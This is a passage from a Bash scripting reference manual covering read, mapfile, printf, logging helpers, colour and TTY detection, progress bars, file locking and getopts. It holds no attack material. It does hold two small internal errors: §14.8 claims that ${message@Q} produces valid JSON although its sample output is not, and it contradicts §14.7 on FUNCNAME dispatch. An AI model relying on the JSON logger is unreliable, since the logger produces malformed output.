```bash
# scenario: read a single line verbatim
while IFS= read -r line; do
  printf '[%s]\n' "$line"
done < file.txt
```

`IFS=` for that one command sets the local field separator to empty —
no splitting, leading/trailing whitespace preserved (BCS0905). The `-r`
suppresses backslash escape interpretation. Together they form the
single most copy-pasted bash idiom.

### Loop discipline under `set -e`

`read` returns non-zero at EOF. That looks like an error to `errexit`
but is exempt when `read` is the loop *condition* — strict mode does
not exit on the failing test of a `while`. Calling `read` outside a
loop condition (or inside `if`/`||`) under `set -euo pipefail` requires
no special handling for the same reason.

### Timeout-loop pattern

`-t` lets a script poll a slow input without blocking forever. The
exit status disambiguates timeout from EOF:

```bash
# scenario: read events for at most 60 s, exit cleanly on EOF or timeout
declare -i deadline=$((SECONDS + 60))
while (( SECONDS < deadline )); do
  if IFS= read -r -t 1 event; then
    process "$event"
  else
    rc=$?
    # ⇒ rc == 142 means timeout (no data this second)
    # ⇒ rc == 1   means EOF (peer closed)
    (( rc > 128 )) || break
  fi
done
```

`(( rc > 128 ))` distinguishes a signal/timeout (`128 + n`) from a
plain EOF (rc == 1). The pattern composes with `coproc` (§17.1) and
`/dev/tcp` (§17.6) where the peer may stall indefinitely.

### NUL-separated input

When file names may contain newlines, switch to NUL framing:

```bash
# scenario: feed every regular file under . into read, NUL-safe
while IFS= read -r -d '' path; do
  process "$path"
done < <(find . -type f -print0)
```

### See also

- §14.3 — `mapfile` for whole-input-into-array (faster than a `read` loop)
- §6.x — process substitution (`< <(...)`) for non-pipe-subshell input
- BCS0905 (input redirection), BCS0901 (safe file testing)

## 14.3 `mapfile` / `readarray`

Read all of stdin (or a specified fd) into an array, one line per
element. `readarray` is a synonym; both names invoke the same builtin.

### Flag reference

- `mapfile -t arr < file` — strip trailing newline (`-t`).
- `-d DELIM` — use DELIM instead of newline as separator (Bash 4.4+).
- `-d ''` — NUL-separated input; pairs with `find -print0`.
- `-n N` — read at most N elements.
- `-O ORIGIN` — start storing at index ORIGIN.
- `-s SKIP` — discard the first SKIP elements.
- `-c COUNT -C CALLBACK` — call CALLBACK every COUNT elements (rare).
- `-u FD` — read from fd FD.

### File-into-array idiom

The faster, safer replacement for `while read -r line; do arr+=("$line"); done`:

```bash
# scenario: load every line of a config into an array, no trailing \n
declare -a lines
mapfile -t lines < /etc/hosts
printf 'loaded %d lines\n' "${#lines[@]}"
# ⇒ loaded
# (N depends on the host's /etc/hosts; the prefix `loaded ` is the only
#  load-bearing part)
```

Without `-t`, each element retains its trailing newline — almost never
what callers want. The performance gap matters for files larger than a
few thousand lines: `mapfile` reads in a single pass, the `read` loop
forks no extra processes but pays per-line builtin overhead.

### NUL-separated reads

Use `-d ''` when the input is NUL-framed (e.g., from `find -print0`):

```bash
# scenario: gather every regular file under . into a NUL-safe array
declare -a files
mapfile -d '' -t files < <(find . -type f -print0)
printf '%s\n' "${files[@]}"
```

This is the canonical "list of paths that may contain newlines" pattern.
The combination of `-d ''` (NUL delimiter), `-t` (strip the delimiter),
and process substitution (§6.x) avoids both the IFS-mangling pitfall
of `read -a` and the subshell trap of piping into `while`.

### `IFS` does not apply

Unlike `read -a`, `mapfile` does not split on `IFS`. Each delimited
chunk becomes one array element verbatim — surprise readers coming from
`read -a "${IFS}"` should consult §13 expansion rules.

### See also

- §14.2 — `read` for line-by-line streaming when memory matters
- §6.x — process substitution
- BCS0206 (arrays), BCS0905 (input redirection)

## 14.4 The `printf` builtin

Formatted output. Always preferred over `echo` (BCS0305, BCS0705) for
predictability across shells, escapes, and arguments that might begin
with `-`.

### Calling form

- `printf 'format' arg1 arg2 …`.
- The format string is *reused* for additional args:
  `printf '%s\n' a b c` prints three lines.
- Specifiers: `%s`, `%d`, `%i`, `%u`, `%o`, `%x`, `%X`, `%c`, `%b`, `%q`,
  `%(fmt)T` (see §14.6 for the full reference).
- `%b` — interpret `\` escapes in the argument (use sparingly).
- `%q` — quote the argument so the shell can re-read it safely
  (BCS0306).
- Width and precision: `%-10s` (left-align width 10), `%05d` (zero-pad),
  `%.3f` (three decimals).
- Width via argument: `%*s` (Bash 4.0+).

### Capturing output with `printf -v`

`printf -v VAR ...` stores the formatted result directly in `VAR` —
no fork, no command substitution, no trailing-newline stripping.

```bash
# scenario: build a key without spawning a subshell
declare -- account='okusi' env='prod'
printf -v key '%s_%s.lock' "$account" "$env"
echo "$key"                      # ⇒ okusi_prod.lock
```

This is the canonical idiom for in-line string assembly inside hot
loops or strict-mode subshell-sensitive code (BCS0411). Compare with
`key=$(printf ...)` which forks and trims a trailing newline.

### Timestamp formatting with `%(fmt)T`

`%(fmt)T` invokes `strftime(3)` against the integer argument; the
sentinel `-1` substitutes the current time, `-2` the shell start time
(Bash 4.2+).

```bash
# scenario: timestamp every log line with no fork
printf '%(%F %T)T %s\n' -1 'started run'
# ⇒ 2026-05-03 14:32:07 started run

# scenario: ISO-8601 with timezone, repeating per arg
printf '%(%Y-%m-%dT%H:%M:%S%z)T -- %s\n' -1 'init' -1 'ready'
```

The format reuse means each `arg` consumes one `T` specifier — passing
`-1` per call snapshots the current time at format time, useful when
several events share a single `printf` call.

### `printf -v` with arrays

`printf -v 'arr[2]' '%s' "$value"` writes into the third element of an
indexed array without subshell or command substitution. Useful in
performance-sensitive code that builds large structures.

### See also

- §14.5 — why `echo` fails and `printf` does not
- §14.6 — full format-specifier reference
- BCS0305 (printf patterns), BCS0306 (`%q` quoting)

## 14.5 `printf` vs `echo`

`echo` is unsafe in scripts. `printf` is the universal answer
(BCS0305, BCS0705).

### Why `echo` breaks

- `echo` interprets `-n`, `-e`, `-E` flags inconsistently across shells
  and even across `echo` versions (`/bin/echo` vs the bash builtin).
- `echo "$var"` may print nothing if `$var` is `-n`, or interpret
  escapes if `$var` is `-e`.
- `echo` cannot reliably emit text containing a leading `-`.
- Line termination is fixed (or controlled by flags whose presence
  varies).

### The `-e` failure mode demonstrated

```bash
# wrong — variable-controlled echo eats its own argument
declare -- var='-e'
echo "$var"
# → prints an empty line; `-e` is consumed as a flag

declare -- payload='hello\tworld'
echo "$payload"
# ⇒ hello\tworld
echo -e "$payload"
# → "hello<TAB>world" — `\t` is now interpreted

# right — printf %s is contract-stable
printf '%s\n' "$var"
# ⇒ -e
printf '%s\n' "$payload"
# ⇒ hello\tworld
```

The pathological case is data-driven: a script that echoes user input
silently swallows arguments shaped like option flags. `printf '%s\n'`
treats every argument as opaque text — there is no flag-parsing step
to confuse.

### Idiom register

Memorise these three forms:

- `printf '%s\n' "$var"` — one line, newline-terminated (replaces
  `echo "$var"`).
- `printf '%s' "$var"` — no trailing newline (replaces `echo -n "$var"`).
- `printf '%s\0' "$var"` — NUL-terminated, pairs with `read -d ''` and
  `mapfile -d ''`.

For multiple values:

- `printf '%s\n' "${arr[@]}"` — one element per line (the format
  string repeats).
- `printf -- '--%s\n' "${flags[@]}"` — note the `--` to terminate
  `printf` option parsing if a format begins with `-`.

### See also

- §14.4 — printf builtin reference
- §14.6 — format specifiers
- BCS0305 (printf patterns), BCS0307 (anti-patterns)

## 14.6 Format specifiers

Detailed reference.

- `%d`, `%i` — signed integer.
- `%u` — unsigned integer.
- `%o` — octal.
- `%x`, `%X` — hex (lower/upper).
- `%e`, `%E` — scientific.
- `%f`, `%F` — fixed-point float.
- `%g`, `%G` — auto-format float.
- `%c` — single character.
- `%s` — string.
- `%b` — string with `\` escapes interpreted.
- `%q` — shell-quoted string.
- `%n$X` — positional argument N (Bash 4.0+).
- `%(fmt)T` — date/time.
- Flags: `-` left-align, `+` always sign, ` ` space-pad sign, `#` alternate, `0` zero-pad.

## 14.7 Logging discipline

Every non-trivial script needs a small set of diagnostic helpers:
`info`, `success`, `warn`, `error`, `die`. The BCS canonical
implementation (BCS0703) is a single `_msg` core that dispatches by
icon argument, with per-level wrappers. All output goes to stderr
(§14.1) so the script remains pipe-composable.

### Canonical implementation

The pattern below is lifted verbatim from the BCS reference scripts.
The whole messaging suite is roughly 15 lines:

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r SCRIPT_NAME=${0##*/}
declare -i VERBOSE=1 DEBUG=0

# Colour init — see §14.9 (BCS0706)
if [[ -t 1 && -t 2 ]]; then
  declare -r RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' \
             CYAN=$'\033[0;36m' NC=$'\033[0m'
else
  declare -r RED='' GREEN='' YELLOW='' CYAN='' NC=''
fi

_msg()    { >&2 printf "$SCRIPT_NAME: $1 %s\n" "${@:2}"; }
error()   { _msg "$RED✗$NC"     "$@"; }
die()     { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
warn()    { _msg "$YELLOW▲$NC"  "$@"; }
info()    { ((VERBOSE)) || return 0; _msg "$CYAN◉$NC"   "$@"; }
success() { ((VERBOSE)) || return 0; _msg "$GREEN✓$NC"  "$@"; }
debug()   { ((DEBUG))   || return 0; _msg "${RED}DEBUG$NC" "$@"; }
```

### How `_msg` dispatch works

`_msg` is the only function that touches stdio. Every wrapper passes
its severity icon as `$1` and forwards the user's message arguments
as `${@:2}`. Inside `_msg`:

- `>&2` — redirect the entire command to stderr (§14.1).
- `printf "$SCRIPT_NAME: $1 %s\n"` — format string carries the script
  name and the icon literally; the message words go through `%s`.
- `"${@:2}"` — every argument from position 2 onward becomes its own
  `%s`; `printf` recycles the format until inputs are exhausted, so
  one-liners and multi-arg calls both behave correctly.

### Behaviour by severity

```bash
# scenario: typical use throughout a script
info 'Loading configuration'        # only when VERBOSE=1 (default)
success 'Imported 42 records'       # only when VERBOSE=1
warn 'Cache stale; rebuilding'      # always shown
error 'Connection refused'          # always shown
die 22 'Invalid argument:' "$1"     # always shown, then exits 22
debug "PATH=$PATH"                  # only when DEBUG=1
```

| Helper    | Visible when    | Goes to | Exits? |
|-----------|-----------------|---------|--------|
| `info`    | `VERBOSE=1`     | stderr  | no     |
| `success` | `VERBOSE=1`     | stderr  | no     |
| `warn`    | always          | stderr  | no     |
| `error`   | always          | stderr  | no     |
| `die`     | always          | stderr  | yes    |
| `debug`   | `DEBUG=1`       | stderr  | no     |

`die N msg ...` is the canonical exit helper: first argument is the
exit code, remaining arguments form the error message. Exit codes
follow the BCS table (1 general, 2 usage, 22 invalid argument, …).
`die N` with no message exits silently — useful for terminating
without further output.

### Invocation patterns

```bash
# scenario: pass the script name through automatically
$ myscript --bogus
myscript: ✗ Invalid argument '--bogus'
$ echo $?
22

# scenario: VERBOSE off, only warnings/errors visible
$ VERBOSE=0 myscript
myscript: ▲ Cache stale; rebuilding
```

Note that `$SCRIPT_NAME` (BCS0102) is referenced at every call but
expanded once in the format string — efficient and consistent. Multi-
argument calls produce one line per argument because the format is
`%s\n`; pre-format with `printf -v` if you need a single line:

```bash
printf -v line 'records=%d errors=%d' "$n" "$err"
info "$line"
```

### Why FUNCNAME dispatch is *not* used here

A common alternative is a single `msg` function that inspects
`${FUNCNAME[1]}` to pick its icon. The BCS pattern is simpler: each
wrapper passes the icon explicitly. This avoids one stack-frame
lookup per message and keeps `_msg` callable from anywhere
(including subshells where `FUNCNAME[1]` may be empty).

### Timestamps and structured logging

For longer-running scripts, prepend a timestamp via `printf`'s
`%(fmt)T` specifier (built-in, no `date(1)` fork):

```bash
# scenario: extend _msg with an ISO-8601 timestamp
_msg() {
  >&2 printf '[%(%FT%T%z)T] %s: %s %s\n' \
    -1 "$SCRIPT_NAME" "$1" "${*:2}"
}
```

The `-1` argument tells `printf` to use *now* as the time. For
machine-readable output (pipe to `jq`, store in a journal), build a
structured logger that emits a single JSON line per call — but keep
it on stderr so pipelines see only data on stdout (§14.1).

### Anti-patterns to avoid

```bash
# wrong — diagnostic on stdout, breaks pipelines
echo "Loading config"
echo "$result"

# wrong — colour codes hard-coded; breaks log files
echo -e '\033[31mERROR\033[0m: failed'

# wrong — multiple bare echoes; no script-name context
echo "WARN: cache stale"
echo "INFO: rebuilding"

# right — single helper, stderr, conditional colour
warn 'cache stale'
info 'rebuilding'
```

A script that uses the BCS messaging suite from line one rarely
acquires logging bugs — every diagnostic flows through one place.

### See also

- §14.1 — stdout/stderr discipline (why diagnostics go to stderr)
- §14.9 — colour init for `RED`/`GREEN`/etc.
- §14.8 — log levels and `VERBOSE`/`DEBUG` gating
- BCS0703 (messaging system), BCS0102 (`SCRIPT_NAME`),
  BCS0706 (colour definitions)

## 14.8 Log levels

Standard severity hierarchy. Bash scripts that ship to production should
honour at least three levels (info / warn / error) plus a debug channel
gated by a verbosity flag (BCS0701, BCS0703).

### Severity ladder

- **DEBUG** — detailed trace, off by default.
- **INFO** — normal operational message.
- **WARN** — concerning but not failing.
- **ERROR** — failed operation; script may continue.
- **FATAL** — failed and exiting (BCS `die` at exit code 1+).

### BCS messaging aliases

The BCS `_msg()` helper dispatches by `FUNCNAME`, exposing one alias
per level:

| Alias | Severity | Stream | Default visibility |
|-------|----------|--------|-------------------|
| `info`    | INFO  | stderr | shown when `VERBOSE >= 1` |
| `success` | INFO  | stderr | shown when `VERBOSE >= 1` |
| `warn`    | WARN  | stderr | always |
| `error`   | ERROR | stderr | always |
| `die`     | FATAL | stderr | always (then `exit`) |

Verbosity flags map to integers: `-q` → `VERBOSE=0`, default → 1,
`-v` → 2, `-vv` → 3 (DEBUG). Each helper checks `VERBOSE` before
emitting (see §14.7 for the implementation).

### Structured logging (JSON)

When the consumer is a log aggregator (journald, Loki, ELK), structured
output beats colourised text:

```bash
# scenario: emit one JSON object per event for downstream parsing
declare -r LOG_HOST=$(hostname -s)
declare -r LOG_SCRIPT=${0##*/}

log_json() {
  local -- level=$1 message=$2
  printf '{"ts":"%(%FT%T%z)T","host":"%s","script":"%s","level":"%s","msg":%s}\n' \
    -1 "$LOG_HOST" "$LOG_SCRIPT" "$level" "${message@Q}" >&2
}

log_json info  'starting backup'
log_json warn  'disk above 80%'
log_json error 'rsync exited 23'
# ⇒ {"ts":"2026-05-03T14:32:07+0700","host":"okusi","script":"backup","level":"info","msg":'starting backup'}
```

The `${message@Q}` parameter transformation produces a shell-safe
quoted string (BCS0306) which is also valid JSON for ASCII messages;
for arbitrary Unicode, pipe through `jq -Rsa .` or use a real logger.

### Filter and aggregate

- `2> >(jq -c '. | select(.level=="error")')` — pre-filter at the
  source by piping stderr through a process substitution.
- `logger -t "$LOG_SCRIPT"` — forward to syslog/journald instead of
  inventing a transport.
- `systemd-cat -t "$LOG_SCRIPT"` — same idea, journald-native.

### See also

- §14.7 — full `_msg()` implementation and dispatch table
- §14.1 — why diagnostics belong on stderr
- BCS0701 (message control flags), BCS0703 (core messaging system)

## 14.9 Coloured output and TERM detection

Coloured diagnostics improve readability on a terminal but corrupt log
files, CI captures, and pipelines. The fix is to gate every colour
constant on a TTY check and define empty fallbacks otherwise. The BCS
pattern (BCS0706) does this once at script top, producing a set of
constants every messaging helper can use unconditionally.

### Canonical initialisation block

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

if [[ -t 1 && -t 2 ]]; then
  declare -r RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' \
             CYAN=$'\033[0;36m' BOLD=$'\033[1m' NC=$'\033[0m'
else
  declare -r RED='' GREEN='' YELLOW='' CYAN='' BOLD='' NC=''
fi
```

The branches declare *the same set of variables* (BCS0706) — every name
exists in both modes. Messaging helpers can write `"$RED✗$NC"`
without conditional logic; when output is redirected, the colour
expansions are empty and the icons render as plain text.

### Why both `-t 1` *and* `-t 2`

`[[ -t 1 ]]` checks stdout; `[[ -t 2 ]]` checks stderr. The BCS pattern
requires both because messaging functions write to stderr (§14.1) but
data may be piped from stdout — colouring stderr while stdout is
captured is harmless, but a script that only checks `-t 1` will turn
colour off whenever its data is piped, even though the human is still
watching stderr. The pragmatic compromise BCS adopts is to colour only
when *both* descriptors are TTYs — i.e. the script is running fully
interactively.

### `tput` versus raw ANSI escapes

There are two ways to get colour codes:

```bash
# scenario: raw ANSI (BCS canonical)
declare -r RED=$'\033[0;31m' RESET=$'\033[0m'

# scenario: tput from terminfo
declare -r RED=$(tput setaf 1) RESET=$(tput sgr0)
```

| Aspect          | Raw ANSI ($'\033[…m')          | `tput setaf N`                 |
|-----------------|--------------------------------|--------------------------------|
| Portability     | Any ANSI/VT100 terminal        | Anything terminfo supports     |
| Failure mode    | Garbage on non-ANSI terminals  | Empty string if `TERM=dumb`    |
| Dependencies    | None (built into bash)         | Requires `ncurses`/terminfo    |
| Run-time cost   | Zero (string literal)          | One fork+exec per invocation   |
| Truecolor       | Direct: `\033[38;2;R;G;Bm`     | Limited to terminfo capability |

BCS prefers raw ANSI for two reasons: it is a string constant assigned
once, and modern terminals (`xterm-256color`, `screen`, `tmux`,
`alacritty`, `kitty`) all honour the standard ANSI sequences. `tput` is
preferred only when broad portability to obscure terminals matters more
than fork cost.

### Adding a `TERM=dumb` guard

If the script may run under `make`, `emacs shell`, or a CI logger that
sets `TERM=dumb`, extend the test:

```bash
# scenario: paranoid TTY+TERM gate
if [[ -t 1 && -t 2 && ${TERM:-} != dumb ]]; then
  declare -r RED=$'\033[0;31m' RESET=$'\033[0m'
else
  declare -r RED='' RESET=''
fi
```

Note `${TERM:-}` — the default expansion is required because `TERM`
may be unset under `set -u`.

### Honouring `NO_COLOR`

The `NO_COLOR` convention (no-color.org) lets users opt out by
exporting any non-empty value. Adding the check costs one term:

```bash
if [[ -t 1 && -t 2 && ${TERM:-} != dumb && -z ${NO_COLOR:-} ]]; then
  declare -r RED=$'\033[0;31m' RESET=$'\033[0m'
else
  declare -r RED='' RESET=''
fi
```

A `--no-colour` CLI flag can also clobber the constants after parsing,
but that requires `declare` without `-r` so the values stay mutable.

### Common pitfalls

- **Embedded newlines** — `printf` format strings containing colour
  codes must end with `\n`, never embed `\n` between colour and text;
  many terminals reset colour state at end-of-line.
- **Tab-completion menus** — completion scripts inherit the shell's
  TTY status; colour escapes in completion lists confuse `compgen`.
  Disable colour explicitly inside completion functions.
- **Forked subshells** — child processes do not re-evaluate `[[ -t N ]]`;
  if a script forks and the child's fd is redirected, the inherited
  constants remain ANSI-coded. Either re-run the gate in the child
  context or pass the colour state through environment.

### See also

- §14.7 — logging discipline (consumer of these constants)
- §14.1 — stdout/stderr discipline
- §14.10 — progress indicators (also colour-gated)
- BCS0706 (colour definitions), BCS0703 (messaging system),
  BCS0405 (declare only colours actually used)

## 14.10 Progress indicators

Long-running tasks benefit from progress feedback on stderr (§14.1).
The two canonical forms — spinner and bar — both rely on `\r` (carriage
return without newline) and on the script being able to detect a TTY.

### TTY guard

Progress output to a non-TTY destination corrupts logs and pipelines.
Always gate with `[[ -t 2 ]]`:

```bash
# scenario: enable progress output only when stderr is a real terminal
declare -i SHOW_PROGRESS=0
[[ -t 2 ]] && SHOW_PROGRESS=1

# also disable under -q (BCS verbosity discipline)
((VERBOSE)) || SHOW_PROGRESS=0
```

Production pipelines run with stderr captured; the guard keeps log
files free of `\r`-spam.

### Spinner

```bash
# scenario: spin while a background job runs, clear when done
spin() {
  local -- frames='|/-\' i=0
  while kill -0 "$1" 2>/dev/null; do
    printf '\r%s' "${frames:i++%4:1}" >&2
    sleep 0.1
  done
  printf '\r \r' >&2          # clear the spinner cell
}

long_task &
((SHOW_PROGRESS)) && spin "$!"
wait "$!"
```

`kill -0 PID` tests whether the PID is alive without delivering a
signal (BCS1101). The `\r \r` epilogue overwrites the last frame and
returns the cursor to column 0 so the next message starts cleanly.

### Bar

```bash
# scenario: draw a 40-column bar from a percentage
draw_bar() {
  local -i pct=$1 width=40 filled
  filled=$(( pct * width / 100 ))
  printf '\r[%-*s] %3d%%' "$width" "$(printf '#%.0s' $(seq 1 "$filled"))" "$pct" >&2
}

declare -i total=$(( $(wc -l < input) + 0 ))
declare -i seen=0
while IFS= read -r _; do
  seen+=1
  ((SHOW_PROGRESS)) && draw_bar $(( seen * 100 / total ))
done < input
((SHOW_PROGRESS)) && printf '\n' >&2
```

`printf '#%.0s' $(seq 1 N)` is the BCS-idiomatic "repeat a string N
times" pattern: the format `%.0s` consumes the argument and prints
the literal `#`. Always end with a newline once the loop finishes;
otherwise the next message is overwritten by terminal scrollback.

### Library fallbacks

- `pv` — pipe-based progress, byte-aware: `tar c . | pv -s "$bytes" > out.tar`.
- `dialog` / `whiptail` — full-screen TUI; reach for these when a
  spinner is no longer enough.
- `rsync --info=progress2` — rsync's own bar; saves writing one.

### See also

- §14.1 — stdout/stderr discipline
- §14.9 — colour and `TERM` detection (spinner colours)
- BCS0707 (TUI basics), BCS0708 (terminal capabilities)

## 14.11 Reading binary data

Bash is byte-oriented but treats NUL specially. Reading binary requires
care, and the safe outcome is usually "shell out to a tool that handles
binary natively."

### The NUL constraint

- Bash strings cannot contain NUL bytes — the C-string termination
  rule applies to every variable.
- `read -d ''` reads up to the next NUL (the NUL itself becomes the
  delimiter and is discarded).
- `mapfile -d ''` reads NUL-separated chunks into array elements.
- `IFS= read -r -n N var` reads N bytes but silently drops any NULs in
  the run.

### NUL-separated mapfile from `find -print0`

The canonical "list of files that may contain newlines" idiom:

```bash
# scenario: collect every regular file under . into a NUL-safe array
declare -a files
mapfile -d '' -t files < <(find . -type f -print0)
printf 'collected %d paths\n' "${#files[@]}"

# scenario: per-file processing without splitting on whitespace
for path in "${files[@]}"; do
  printf 'processing %q\n' "$path"
done
```

`find -print0` emits each filename followed by a NUL; `mapfile -d ''`
treats NUL as the record separator; `-t` strips it from each stored
element. The result is an array where every element is a literal
file path — newlines, spaces, and shell metacharacters preserved.

### Hex / octal escape hatches

For genuine binary processing, hand off to a tool that does not
care about NUL:

- `xxd -p file | tr -d '\n'` — hex string, easily processed in bash.
- `od -An -vtx1 file` — alternative hex dump, more portable.
- `hexdump -ve '1/1 "%02x"'` — hex output with full control over format.
- `dd bs=1 skip=N count=M` — extract a byte range.

```bash
# scenario: read a single byte at offset 0x42 as a hex string
declare -- byte
byte=$(dd if=image.bin bs=1 skip=66 count=1 2>/dev/null | xxd -p)
# ⇒ byte='ff'
```

### Safety boundary

If a script's logic requires inspecting raw bytes, the bash layer
should be a thin wrapper around a real binary-aware program (Python,
awk, perl, dedicated tool). See §20 for the security implications of
mishandling binary input from untrusted sources.

### See also

- §14.2 — `read -d ''` for NUL-framed line input
- §14.3 — `mapfile -d ''` for whole-input-into-array
- §20.5 — binary input from untrusted sources
- BCS1005 (input sanitization)

## 14.12 File locking for concurrent writes

Multiple processes writing to the same file: lock or rely on the
kernel's small-write atomicity. The choice depends on the size of each
write, not on the file's overall size.

### `O_APPEND` and `PIPE_BUF`

When a file is opened in append mode (`O_APPEND` — bash sets this
automatically for `>>`), each `write(2)` is atomic *with respect to
other appenders* if the byte count does not exceed `PIPE_BUF`. On
Linux, `PIPE_BUF` is 4096 bytes; on POSIX it is at least 512.

Querying the local value:

```bash
# scenario: discover the local PIPE_BUF before designing a log format
declare -i pipe_buf
pipe_buf=$(getconf PIPE_BUF /)
printf 'PIPE_BUF on this filesystem: %d bytes\n' "$pipe_buf"
# ⇒ PIPE_BUF on this filesystem:
# (Linux normally reports 4096; POSIX guarantees at least 512)
```

The header constant lives in `<limits.h>`; `getconf` reports the value
the running kernel honours for the given path. Network filesystems
(NFS) frequently report 4096 but the underlying server may not honour
the guarantee — locking is mandatory there.

### When `>>` is enough

Bash's `cmd >> file` opens with `O_APPEND`. Writes ≤ `PIPE_BUF` bytes
are guaranteed not to interleave between concurrent appenders on
local filesystems:

```bash
# scenario: 8 workers logging short lines safely
log() { printf '%s [%s] %s\n' "$(date -Iseconds)" "$$" "$*" >> shared.log; }

for i in {1..8}; do
  ( log "worker $i started"; ) &
done
wait
printf 'shared.log line count: %d\n' "$(wc -l < shared.log)"
# ⇒ shared.log line count: 8
```

Each `printf` produces well under 4096 bytes, so each `write(2)` is
indivisible. No `flock` required.

### When `flock` is mandatory

Once any single write may exceed `PIPE_BUF`, or once the application
needs to read-modify-write, lock around the critical section:

```bash
# scenario: append a JSON record that may exceed PIPE_BUF
{
  flock -x 200
  printf '%s\n' "$LARGE_JSON_BLOB" >> shared.log
} 200>>shared.log
```

The subshell pattern (`{ ... } 200>>file`) opens fd 200 once and holds
the lock for the duration of the block — `flock -x 200` acquires an
exclusive lock on that fd; the kernel releases it when the fd closes.
See §16.10 for the full locking primitives discussion.

### Log-rotation interaction

Atomic small-writes survive `logrotate` if the rotator uses
`copytruncate` (data race tolerated) or `create` with a HUP-handler
in the writer (writer reopens on signal — §12.16). A plain `mv` of an
open log file silently sends future writes to the moved inode; the
`>>` semantics mean the writer never notices.

### See also

- §16.10 — `flock` and other locking primitives
- §12.14 — lockfile pattern (PID-write variant)
- §12.16 — reload-on-SIGHUP for log rotation
- BCS1006 (temporary file handling), BCS1101 (background job management)

# Part XV — Command-Line Processing

*Parsing command-line arguments is the most-reused piece of code in Bash scripts. This Part documents the conventions and the canonical patterns: getopts, hand-rolled parsing, GNU getopt, and subcommand dispatch.*

---

---

## 15.1 CLI conventions

Conventions for command-line interfaces that bash scripts should follow
(BCS0801, BCS0806). Following them keeps a script's surface predictable
to humans, shells, and other tools.

### Form register

- **Short options** — `-x`, single character, may take a value
  (`-fname` or `-f name`).
- **Long options** — `--long`, may take a value (`--file=name` or
  `--file name`).
- **Bundled short** — `-abc` is `-a -b -c` (each must be flag-only;
  see §15.6).
- **End-of-options** — `--` terminates options; everything after is
  positional (§15.7).
- **Stdin/stdout sentinel** — `-` alone is conventionally "stdin" or
  "stdout".

### Standard option register

| Short | Long | Purpose |
|-------|------|---------|
| `-h` | `--help` | print usage and exit 0 |
| `-V` | `--version` | print version and exit 0 |
| `-v` | `--verbose` | increase verbosity |
| `-q` | `--quiet` | suppress informational output |
| `-n` | `--dry-run` | simulate without changing state |
| `-y` | `--yes` | assume yes to prompts |
| `-f` | `--force` | override safety checks |

### Concrete invocation examples

The same script should accept all conventional forms — calls below all
parse to the same effective configuration:

```bash
# scenario: every form a well-behaved CLI must accept
mytool -v -n -f config.yaml input.txt
mytool --verbose --dry-run --file config.yaml input.txt
mytool --verbose --dry-run --file=config.yaml input.txt
mytool -vnf config.yaml input.txt           # bundled, last takes value
mytool -vn --file config.yaml -- -input.txt # -- protects positional
```

The `--` form is what distinguishes a careful caller: a filename of
`-input.txt` would otherwise be parsed as the unknown option `-i`.

### Discoverability rules

- Help: `-h` *and* `--help` both work, both exit 0 to stdout
  (machine-readable consumers redirect `--help` into a pager).
- Version: `-V` *and* `--version`, output is one line, machine-parsable
  (`name version`).
- Unknown option: exit 22 with a one-line diagnostic on stderr
  (BCS0602).

### Composability

Standard exit codes (§13.10, BCS0602) let pipelines compose:

```bash
# scenario: pipe-friendly CLIs allow this idiom
mytool --quiet input | downstream || die 1 'pipeline failed'
```

`-q` suppresses informational chatter; `||` catches the non-zero exit;
`die` (BCS0703) reports and exits.

### See also

- §15.4 — the canonical hand-rolled parser
- §15.9 — `--help` text conventions
- BCS0801 (standard parsing pattern), BCS0806 (standard options)

## 15.2 `getopts` builtin

POSIX shell builtin for short-option parsing. Strictly less capable
than the BCS hand-rolled `while case` loop (§15.4) — no long options,
no value validation hooks — but adequate for small scripts that only
need traditional one-char options. The patterns below cover the two
features users most often miss: silent error mode and `OPTIND` reset.

### Syntax and globals

- `getopts OPTSTRING name [args]` — parse one option per call,
  storing the option letter in `name`.
- `OPTSTRING` — string of recognised option letters; a `:` after a
  letter means the option takes a value (placed in `OPTARG`).
- `OPTIND` — index of the next argument to process. Bash initialises
  it to 1; reset to 1 manually before re-parsing.
- `OPTARG` — the option's value, or (in silent mode) the offending
  letter.
- `OPTERR=0` — suppress the builtin's own error messages (alternative
  to silent mode).

### Default error mode

When the first character of `OPTSTRING` is *not* `:`, getopts prints
its own diagnostics on illegal options and missing values, sets
`name` to `?`, and continues. This is rarely what you want in a BCS
script — the messages bypass your `error()` helper and ignore
`SCRIPT_NAME` formatting.

### Silent error mode (recommended)

Prefix `OPTSTRING` with `:`. getopts then becomes silent: on an
illegal option `name=?` and `OPTARG=<bad letter>`; on a missing
value `name=:` and `OPTARG=<letter>`. The script controls all
diagnostic output.

```bash
# scenario: full getopts loop with silent mode
parse_args() {
  local OPTIND opt
  OPTIND=1                                    # always reset for safety
  while getopts ':vqf:h' opt; do
    case $opt in
      v) VERBOSE=1 ;;
      q) VERBOSE=0 ;;
      f) FILE=$OPTARG ;;
      h) show_help; return 0 ;;
      :) die 22 "option -$OPTARG requires a value" ;;
      \?) die 22 "unknown option: -$OPTARG" ;;
    esac
  done
  shift $((OPTIND - 1))                       # consume parsed options
  POSITIONAL=("$@")
}
```

Notes:

- `local OPTIND opt` — `OPTIND` is **global** by default; localising
  it inside a function lets the function be called repeatedly without
  manual reset and protects the caller's parser state.
- `\?` is the catch-all for unknown letters; `:` is the missing-value
  case — these only fire because `OPTSTRING` begins with `:`.
- `shift $((OPTIND - 1))` after the loop drops the consumed
  options; the remaining `$@` is positional arguments.
- `die 22` follows the BCS exit-code convention (BCS0801,
  exit code 22 = invalid argument).

### Re-parsing the same arguments

`getopts` resumes from `OPTIND` on every call, so re-parsing requires
an explicit reset. The pattern matters when a subcommand re-parses
its own slice of the arguments:

```bash
# scenario: outer parse, then reset for inner subcommand
declare -i outer_v=0
declare -A inner_flags=()

OPTIND=1
while getopts ':v' opt; do
  case $opt in v) outer_v=1 ;; esac
done

OPTIND=1                              # reset before second parse
while getopts ':abc' opt; do
  case $opt in a|b|c) inner_flags[$opt]=1 ;; esac
done
```

### Bundling and value-taking options

`getopts` handles short-option bundling automatically: `-vqf file` is
equivalent to `-v -q -f file`. Value-taking options must appear at the
end of the bundle (`-vqf file`, not `-fvq file` — the latter sets
`f`'s value to `vq`).

For BCS scripts that need long options as well, do not try to extend
`getopts`; switch to the hand-rolled `while case` pattern in §15.4
